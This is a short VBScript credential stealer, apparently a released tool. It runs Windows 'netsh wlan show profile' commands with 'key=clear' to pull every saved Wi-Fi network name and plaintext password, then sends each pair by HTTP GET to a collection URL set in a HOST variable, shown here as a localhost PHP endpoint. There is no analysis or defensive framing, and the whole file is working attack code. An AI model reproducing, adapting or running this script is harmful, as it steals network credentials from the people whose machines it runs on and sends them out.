'//////////////////////////////////////////////
'//            ε013 V 2.0 (HTTP)
'//          Jordan Dalcq - 0v3rl0w
'/////////////////////////////////////////////

'///////////////// HOST INFO //////////////////
HOST = "http://localhost:8000/e013-http.php"
'/////////////////////////////////////////////

Function GetOutput(command)
  Set Shell = Wscript.CreateObject("WScript.Shell")
  Set cmd = Shell.Exec("cmd /c  " & command)
  strOut = ""

  Do While Not cmd.StdOut.AtEndOfStream
    strOut = strOut & cmd.StdOut.ReadLine() & "\n"
  Loop
  GetOutput=strOut
End Function

Function sendIt(wifi, passwd)
  Set request = CreateObject("MSXML2.XMLHTTP")
  request.Open "GET", HOST & "/?ssid=" & wifi & "&pass=" & passwd, False
  request.Send
End Function

strText=Split(GetOutput("netsh wlan show profile"), "\n")

i = 0

For Each x in strText
	If i > 8 And i < Ubound(strText)-1 Then
		Name = Split(x, ": ")(1)
		str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")(32)
		passwd = Split(str, ": ")
		If Ubound(passwd) Then
			sendIt Name, passwd(1)
		End If
	End If
	i = i + 1
Next
